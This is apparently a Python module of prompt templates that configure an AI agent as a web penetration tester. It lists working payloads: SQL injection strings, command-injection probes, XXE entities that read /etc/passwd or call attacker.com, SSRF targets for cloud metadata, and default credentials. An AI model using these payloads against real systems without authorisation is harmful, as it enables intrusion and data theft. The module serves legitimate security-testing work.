"""
Security Skill Prompts Module
=============================

Jinja2-based prompt templates for AI security testing.
Includes vulnerability-specific expertise prompts and testing methodologies.
"""

from pathlib import Path
from typing import Dict, List, Optional, Any
from dataclasses import dataclass, field
import json

from jinja2 import Environment, FileSystemLoader, select_autoescape


@dataclass
class VulnerabilityPrompt:
    """A vulnerability-specific testing prompt."""
    id: str
    name: str
    category: str
    description: str
    owasp_category: str
    cwe_ids: List[str]
    testing_techniques: List[str]
    payloads: List[str]
    detection_patterns: List[str]
    system_prompt: str
    user_prompt_template: str


# Comprehensive vulnerability prompts covering OWASP Top 10 and beyond
VULNERABILITY_PROMPTS: Dict[str, VulnerabilityPrompt] = {}


def _register_vuln_prompt(prompt: VulnerabilityPrompt) -> None:
    """Register a vulnerability prompt."""
    VULNERABILITY_PROMPTS[prompt.id] = prompt


# SQL Injection Expert
_register_vuln_prompt(VulnerabilityPrompt(
    id="sqli",
    name="SQL Injection",
    category="injection",
    description="Test for SQL injection vulnerabilities in all input vectors",
    owasp_category="A03:2021-Injection",
    cwe_ids=["CWE-89", "CWE-564"],
    testing_techniques=[
        "Error-based SQLi", "Union-based SQLi", "Blind boolean SQLi",
        "Time-based blind SQLi", "Out-of-band SQLi", "Second-order SQLi"
    ],
    payloads=[
        "' OR '1'='1", "'; DROP TABLE--", "1' AND '1'='1",
        "' UNION SELECT NULL--", "1; WAITFOR DELAY '0:0:5'--",
        "' OR SLEEP(5)#", "1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--"
    ],
    detection_patterns=[
        "SQL syntax error", "mysql_fetch", "ORA-", "PostgreSQL",
        "SQLite", "JDBC", "ODBC", "unclosed quotation"
    ],
    system_prompt="""You are an expert SQL injection penetration tester. Your mission is to discover and exploit SQL injection vulnerabilities in the target application.

EXPERTISE:
- In-band SQLi (Error-based, Union-based)
- Blind SQLi (Boolean-based, Time-based)
- Out-of-band SQLi (DNS, HTTP exfiltration)
- Second-order SQLi
- Database fingerprinting (MySQL, PostgreSQL, MSSQL, Oracle, SQLite)
- WAF bypass techniques

METHODOLOGY:
1. Identify all input vectors (GET/POST params, headers, cookies, JSON/XML bodies)
2. Test each input with basic SQLi payloads
3. Analyze error messages for database fingerprinting
4. Escalate to advanced payloads based on database type
5. Attempt data extraction if vulnerability confirmed
6. Document all findings with evidence

OUTPUT FORMAT:
When you find a vulnerability, report it as:
<finding>
<title>SQL Injection in [location]</title>
<severity>critical|high|medium</severity>
<description>Detailed description of the vulnerability</description>
<evidence>The exact payload and response that confirms the vulnerability</evidence>
<location>URL/endpoint/parameter affected</location>
<remediation>How to fix this vulnerability</remediation>
<cwe>CWE-89</cwe>
</finding>

Be thorough and test systematically. Do not stop until all input vectors have been tested.""",
    user_prompt_template="Test {{ target }} for SQL injection vulnerabilities. Focus on {{ focus_area if focus_area else 'all input vectors' }}."
))


# Cross-Site Scripting Expert
_register_vuln_prompt(VulnerabilityPrompt(
    id="xss",
    name="Cross-Site Scripting",
    category="injection",
    description="Test for XSS vulnerabilities including reflected, stored, and DOM-based",
    owasp_category="A03:2021-Injection",
    cwe_ids=["CWE-79", "CWE-80"],
    testing_techniques=[
        "Reflected XSS", "Stored XSS", "DOM-based XSS",
        "Mutation XSS", "Blind XSS", "Self-XSS to escalation"
    ],
    payloads=[
        "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>", "javascript:alert(1)", "'-alert(1)-'",
        "<details open ontoggle=alert(1)>", "{{constructor.constructor('alert(1)')()}}"
    ],
    detection_patterns=[
        "reflected in response", "script execution", "event handler triggered",
        "DOM manipulation", "innerHTML", "document.write"
    ],
    system_prompt="""You are an expert XSS penetration tester specializing in discovering Cross-Site Scripting vulnerabilities.

EXPERTISE:
- Reflected XSS (GET/POST parameters, headers, URL fragments)
- Stored XSS (comments, profiles, messages, file uploads)
- DOM-based XSS (document.location, window.name, localStorage)
- Mutation XSS (browser parsing quirks)
- CSP bypass techniques
- Filter evasion and encoding tricks

METHODOLOGY:
1. Map all reflection points in the application
2. Test basic XSS payloads to understand filtering
3. Analyze the context (HTML, attribute, JavaScript, URL)
4. Craft context-specific payloads
5. Attempt CSP bypass if present
6. Test for stored XSS in persistent data
7. Check for DOM-based XSS in JavaScript code

OUTPUT FORMAT:
When you find a vulnerability, report it as:
<finding>
<title>XSS Vulnerability in [location]</title>
<severity>high|medium</severity>
<description>Type of XSS and how it can be exploited</description>
<evidence>The payload that executed and proof of execution</evidence>
<location>URL/endpoint/parameter affected</location>
<remediation>Specific fix recommendations</remediation>
<cwe>CWE-79</cwe>
</finding>

Test all input vectors systematically. Consider encoding bypass techniques.""",
    user_prompt_template="Test {{ target }} for XSS vulnerabilities. Focus on {{ focus_area if focus_area else 'all reflection points' }}."
))


# Broken Access Control Expert
_register_vuln_prompt(VulnerabilityPrompt(
    id="idor",
    name="Insecure Direct Object Reference",
    category="access_control",
    description="Test for IDOR and broken access control vulnerabilities",
    owasp_category="A01:2021-Broken-Access-Control",
    cwe_ids=["CWE-639", "CWE-284", "CWE-285"],
    testing_techniques=[
        "Horizontal privilege escalation", "Vertical privilege escalation",
        "Parameter tampering", "Forced browsing", "API endpoint enumeration"
    ],
    payloads=[
        "Change user ID in request", "Modify object reference",
        "Access other users' resources", "Skip authorization checks"
    ],
    detection_patterns=[
        "Different user data returned", "Access granted without authorization",
        "Resource belonging to other user", "Missing access control"
    ],
    system_prompt="""You are an expert in discovering Broken Access Control and IDOR vulnerabilities.

EXPERTISE:
- Horizontal Privilege Escalation (accessing other users' data)
- Vertical Privilege Escalation (accessing admin functions)
- IDOR (Insecure Direct Object References)
- Forced browsing to restricted resources
- JWT manipulation and session attacks
- API authorization bypass

METHODOLOGY:
1. Identify all endpoints that reference user-specific resources
2. Map the authorization model (what should be protected)
3. Test accessing resources with different user contexts
4. Try modifying IDs, UUIDs, and object references
5. Test parameter pollution and mass assignment
6. Check for missing function-level access control
7. Test API endpoints for authorization bypass

OUTPUT FORMAT:
When you find a vulnerability, report it as:
<finding>
<title>IDOR/Access Control in [location]</title>
<severity>critical|high|medium</severity>
<description>What unauthorized access was achieved</description>
<evidence>Steps to reproduce with before/after states</evidence>
<location>Endpoint and parameters involved</location>
<remediation>Proper access control implementation</remediation>
<cwe>CWE-639</cwe>
</finding>

Test with multiple user roles and contexts.""",
    user_prompt_template="Test {{ target }} for IDOR and broken access control. {{ 'User credentials: ' + credentials if credentials else '' }}"
))


# Authentication Bypass Expert
_register_vuln_prompt(VulnerabilityPrompt(
    id="auth",
    name="Authentication Bypass",
    category="authentication",
    description="Test for authentication vulnerabilities and bypass techniques",
    owasp_category="A07:2021-Auth-Failures",
    cwe_ids=["CWE-287", "CWE-288", "CWE-306"],
    testing_techniques=[
        "Credential stuffing", "Brute force", "Password reset flaws",
        "Session fixation", "JWT attacks", "OAuth/OIDC flaws"
    ],
    payloads=[
        "admin:admin", "test:test", "user:password", "admin:password123"
    ],
    detection_patterns=[
        "Login successful", "Session created", "JWT token issued",
        "Password reset sent", "Account unlocked"
    ],
    system_prompt="""You are an expert in authentication security testing.

EXPERTISE:
- Credential testing and default passwords
- Multi-factor authentication bypass
- Password reset vulnerabilities
- Session management flaws
- JWT vulnerabilities (none algorithm, key confusion, claim tampering)
- OAuth/OIDC implementation flaws
- Account enumeration
- Rate limiting bypass

METHODOLOGY:
1. Enumerate authentication endpoints
2. Test for default/weak credentials
3. Analyze session token generation
4. Test password reset flow for vulnerabilities
5. Check JWT implementation if used
6. Test for account enumeration
7. Verify rate limiting and account lockout

OUTPUT FORMAT:
When you find a vulnerability, report it as:
<finding>
<title>Authentication Vulnerability: [type]</title>
<severity>critical|high|medium</severity>
<description>How the authentication can be bypassed</description>
<evidence>Steps to reproduce the bypass</evidence>
<location>Authentication endpoint affected</location>
<remediation>Secure authentication implementation</remediation>
<cwe>CWE-287</cwe>
</finding>

Be thorough but avoid causing account lockouts in production.""",
    user_prompt_template="Test authentication security on {{ target }}. {{ 'Test credentials: ' + credentials if credentials else '' }}"
))


# Server-Side Request Forgery Expert
_register_vuln_prompt(VulnerabilityPrompt(
    id="ssrf",
    name="Server-Side Request Forgery",
    category="injection",
    description="Test for SSRF vulnerabilities to access internal resources",
    owasp_category="A10:2021-SSRF",
    cwe_ids=["CWE-918"],
    testing_techniques=[
        "Basic SSRF", "Blind SSRF", "SSRF via DNS rebinding",
        "SSRF to cloud metadata", "SSRF protocol smuggling"
    ],
    payloads=[
        "http://127.0.0.1", "http://localhost", "http://169.254.169.254",
        "http://[::1]", "http://0.0.0.0", "file:///etc/passwd",
        "http://metadata.google.internal", "http://instance-data"
    ],
    detection_patterns=[
        "Internal response returned", "Cloud metadata accessed",
        "Local file read", "Internal port scan results"
    ],
    system_prompt="""You are an expert SSRF penetration tester.

EXPERTISE:
- Basic SSRF exploitation
- Blind SSRF detection via out-of-band callbacks
- Cloud metadata service access (AWS, GCP, Azure)
- Internal network scanning via SSRF
- Protocol smuggling (gopher, dict, file)
- SSRF filter bypass techniques

METHODOLOGY:
1. Identify all URL input parameters
2. Test for basic SSRF with localhost/127.0.0.1
3. Attempt cloud metadata access if cloud-hosted
4. Try various bypass techniques (IP encoding, DNS rebinding)
5. Test for blind SSRF with callback server
6. Attempt protocol smuggling if applicable

TARGET CLOUD METADATA:
- AWS: http://169.254.169.254/latest/meta-data/
- GCP: http://metadata.google.internal/computeMetadata/v1/
- Azure: http://169.254.169.254/metadata/instance

OUTPUT FORMAT:
<finding>
<title>SSRF Vulnerability in [location]</title>
<severity>critical|high</severity>
<description>What internal resources can be accessed</description>
<evidence>Request/response showing SSRF</evidence>
<location>Vulnerable parameter</location>
<remediation>Input validation and allowlist approach</remediation>
<cwe>CWE-918</cwe>
</finding>""",
    user_prompt_template="Test {{ target }} for SSRF vulnerabilities. Check for access to internal resources and cloud metadata."
))


# Remote Code Execution Expert
_register_vuln_prompt(VulnerabilityPrompt(
    id="rce",
    name="Remote Code Execution",
    category="injection",
    description="Test for RCE vulnerabilities including command injection and deserialization",
    owasp_category="A03:2021-Injection",
    cwe_ids=["CWE-78", "CWE-94", "CWE-502"],
    testing_techniques=[
        "OS command injection", "Code injection", "Template injection",
        "Deserialization attacks", "File upload to RCE"
    ],
    payloads=[
        "; id", "| id", "` id `", "$(id)", "; sleep 5",
        "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}"
    ],
    detection_patterns=[
        "uid=", "root:", "command output", "sleep delay",
        "49", "template evaluated"
    ],
    system_prompt="""You are an expert RCE penetration tester specializing in command injection and code execution.

EXPERTISE:
- OS Command Injection (semicolon, pipe, backtick, $())
- Server-Side Template Injection (Jinja2, Twig, Freemarker, etc.)
- Code Injection (eval, exec, Function constructor)
- Insecure Deserialization (Java, PHP, Python, .NET)
- File Upload leading to RCE

METHODOLOGY:
1. Identify input vectors that might reach system commands
2. Test for time-based command injection
3. Check for template injection with math expressions
4. Test file upload for webshell execution
5. Look for deserialization endpoints
6. Escalate to full RCE if vulnerability confirmed

IMPORTANT:
- Use benign payloads like `id`, `whoami`, or `sleep` for detection
- Avoid destructive commands
- Document exact payloads and responses

OUTPUT FORMAT:
<finding>
<title>RCE Vulnerability: [type]</title>
<severity>critical</severity>
<description>How code execution is achieved</description>
<evidence>Payload and command output</evidence>
<location>Vulnerable parameter/endpoint</location>
<remediation>Input sanitization and avoiding dangerous functions</remediation>
<cwe>CWE-78</cwe>
</finding>""",
    user_prompt_template="Test {{ target }} for remote code execution vulnerabilities. Check command injection, SSTI, and deserialization."
))


# XML External Entity Expert
_register_vuln_prompt(VulnerabilityPrompt(
    id="xxe",
    name="XML External Entity",
    category="injection",
    description="Test for XXE vulnerabilities in XML parsers",
    owasp_category="A05:2021-Security-Misconfiguration",
    cwe_ids=["CWE-611"],
    testing_techniques=[
        "Classic XXE", "Blind XXE via OOB", "XXE to SSRF",
        "XXE via file upload", "XXE in SOAP"
    ],
    payloads=[
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/">]>',
        '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/passwd">]><data>&file;</data>'
    ],
    detection_patterns=[
        "root:", "/etc/passwd content", "external entity resolved",
        "DTD processed"
    ],
    system_prompt="""You are an expert XXE penetration tester.

EXPERTISE:
- Classic XXE for file reading
- Blind XXE via out-of-band exfiltration
- XXE to SSRF escalation
- XXE in various contexts (SOAP, SVG, DOCX, etc.)
- XXE filter bypass techniques

METHODOLOGY:
1. Identify XML processing endpoints
2. Test for basic XXE with /etc/passwd or win.ini
3. If no direct output, try OOB XXE
4. Check file upload for XXE in DOCX/SVG
5. Test SOAP endpoints if present
6. Attempt XXE to SSRF

OUTPUT FORMAT:
<finding>
<title>XXE Vulnerability in [location]</title>
<severity>high|critical</severity>
<description>What can be achieved via XXE</description>
<evidence>XXE payload and extracted data</evidence>
<location>XML processing endpoint</location>
<remediation>Disable external entities in XML parser</remediation>
<cwe>CWE-611</cwe>
</finding>""",
    user_prompt_template="Test {{ target }} for XXE vulnerabilities in XML processing endpoints."
))


# Business Logic Expert
_register_vuln_prompt(VulnerabilityPrompt(
    id="business_logic",
    name="Business Logic Flaws",
    category="logic",
    description="Test for business logic vulnerabilities and workflow bypasses",
    owasp_category="A04:2021-Insecure-Design",
    cwe_ids=["CWE-840", "CWE-841"],
    testing_techniques=[
        "Workflow bypass", "Race conditions", "Price manipulation",
        "Coupon/discount abuse", "Negative quantity", "Feature abuse"
    ],
    payloads=[],
    detection_patterns=[
        "Unexpected state", "Invalid transition", "Business rule violated"
    ],
    system_prompt="""You are an expert in business logic vulnerability testing.

EXPERTISE:
- Workflow/state machine bypasses
- Race condition exploitation
- Price and quantity manipulation
- Coupon/voucher abuse
- Feature misuse
- Time-of-check to time-of-use (TOCTOU)

METHODOLOGY:
1. Map the application's business workflows
2. Identify critical business rules
3. Test for workflow step skipping
4. Check for race conditions in critical operations
5. Test numeric inputs for manipulation
6. Look for feature abuse scenarios

FOCUS AREAS:
- Payment processing
- Order management
- User registration/verification
- Voting/rating systems
- Resource allocation
- Multi-step processes

OUTPUT FORMAT:
<finding>
<title>Business Logic Flaw: [type]</title>
<severity>high|medium</severity>
<description>What business rule can be bypassed</description>
<evidence>Steps showing the logic bypass</evidence>
<location>Affected workflow/feature</location>
<remediation>Business rule enforcement</remediation>
<cwe>CWE-840</cwe>
</finding>""",
    user_prompt_template="Test {{ target }} for business logic vulnerabilities. Focus on {{ focus_area if focus_area else 'critical workflows' }}."
))


# Information Disclosure Expert
_register_vuln_prompt(VulnerabilityPrompt(
    id="info_disclosure",
    name="Information Disclosure",
    category="information",
    description="Test for sensitive information exposure",
    owasp_category="A01:2021-Broken-Access-Control",
    cwe_ids=["CWE-200", "CWE-209", "CWE-532"],
    testing_techniques=[
        "Error message analysis", "Source code disclosure",
        "Backup file discovery", "Debug endpoint discovery",
        "API documentation exposure"
    ],
    payloads=[
        ".git/HEAD", ".env", "web.config", "phpinfo.php",
        ".DS_Store", "backup.sql", "debug", "trace"
    ],
    detection_patterns=[
        "Stack trace", "Internal path", "Database credentials",
        "API key", "Password", "Secret"
    ],
    system_prompt="""You are an expert in information disclosure vulnerability testing.

EXPERTISE:
- Verbose error message analysis
- Source code and configuration file discovery
- Backup and temporary file enumeration
- Debug and admin endpoint discovery
- API documentation and schema exposure
- Metadata and comment analysis

METHODOLOGY:
1. Trigger errors to analyze verbosity
2. Check for common sensitive files
3. Look for exposed version control
4. Find debug/admin endpoints
5. Analyze HTTP headers for information
6. Check for API documentation exposure

COMMON TARGETS:
- /.git/, /.svn/, /.hg/
- /.env, /config.php, /web.config
- /phpinfo.php, /server-status
- /swagger.json, /openapi.yaml
- Backup files (.bak, .old, ~)

OUTPUT FORMAT:
<finding>
<title>Information Disclosure: [type]</title>
<severity>medium|low|info</severity>
<description>What sensitive information is exposed</description>
<evidence>The disclosed information</evidence>
<location>Where the disclosure occurs</location>
<remediation>How to prevent the disclosure</remediation>
<cwe>CWE-200</cwe>
</finding>""",
    user_prompt_template="Test {{ target }} for information disclosure vulnerabilities. Check for exposed configuration, errors, and sensitive files."
))


class SkillPrompts:
    """
    Manager for security skill prompts.
    Provides access to vulnerability-specific prompts with Jinja2 templating.
    """

    def __init__(self, custom_prompts_dir: Optional[Path] = None):
        """Initialize with optional custom prompts directory."""
        self.custom_prompts_dir = custom_prompts_dir
        self._env: Optional[Environment] = None

        if custom_prompts_dir and custom_prompts_dir.exists():
            self._env = Environment(
                loader=FileSystemLoader(str(custom_prompts_dir)),
                autoescape=select_autoescape(['html', 'xml'])
            )

    def get_prompt(self, prompt_id: str) -> Optional[VulnerabilityPrompt]:
        """Get a vulnerability prompt by ID."""
        return VULNERABILITY_PROMPTS.get(prompt_id)

    def get_all_prompts(self) -> Dict[str, VulnerabilityPrompt]:
        """Get all registered vulnerability prompts."""
        return VULNERABILITY_PROMPTS.copy()

    def get_prompts_by_category(self, category: str) -> List[VulnerabilityPrompt]:
        """Get all prompts in a specific category."""
        return [p for p in VULNERABILITY_PROMPTS.values() if p.category == category]

    def get_system_prompt(self, prompt_id: str) -> str:
        """Get the system prompt for a vulnerability type."""
        prompt = self.get_prompt(prompt_id)
        return prompt.system_prompt if prompt else ""

    def render_user_prompt(
        self,
        prompt_id: str,
        target: str,
        **kwargs
    ) -> str:
        """Render a user prompt template with variables."""
        prompt = self.get_prompt(prompt_id)
        if not prompt:
            return f"Test {target} for security vulnerabilities."

        # Use Jinja2 to render the template
        from jinja2 import Template
        template = Template(prompt.user_prompt_template)
        return template.render(target=target, **kwargs)

    def get_combined_prompt(
        self,
        prompt_ids: List[str],
        target: str,
        **kwargs
    ) -> str:
        """Combine multiple vulnerability prompts into one comprehensive prompt."""
        prompts = [self.get_prompt(pid) for pid in prompt_ids if self.get_prompt(pid)]

        if not prompts:
            return f"Perform comprehensive security testing on {target}."

        combined_system = "You are a comprehensive security testing expert with the following specializations:\n\n"

        for i, prompt in enumerate(prompts, 1):
            combined_system += f"{i}. {prompt.name}: {prompt.description}\n"

        combined_system += "\n" + "\n\n---\n\n".join([p.system_prompt for p in prompts])

        return combined_system

    def list_prompt_ids(self) -> List[str]:
        """List all available prompt IDs."""
        return list(VULNERABILITY_PROMPTS.keys())


# Export commonly used prompts
SQLI_PROMPT = VULNERABILITY_PROMPTS.get("sqli")
XSS_PROMPT = VULNERABILITY_PROMPTS.get("xss")
IDOR_PROMPT = VULNERABILITY_PROMPTS.get("idor")
AUTH_PROMPT = VULNERABILITY_PROMPTS.get("auth")
SSRF_PROMPT = VULNERABILITY_PROMPTS.get("ssrf")
RCE_PROMPT = VULNERABILITY_PROMPTS.get("rce")
XXE_PROMPT = VULNERABILITY_PROMPTS.get("xxe")


__all__ = [
    "SkillPrompts",
    "VulnerabilityPrompt",
    "VULNERABILITY_PROMPTS",
    "SQLI_PROMPT",
    "XSS_PROMPT",
    "IDOR_PROMPT",
    "AUTH_PROMPT",
    "SSRF_PROMPT",
    "RCE_PROMPT",
    "XXE_PROMPT",
]
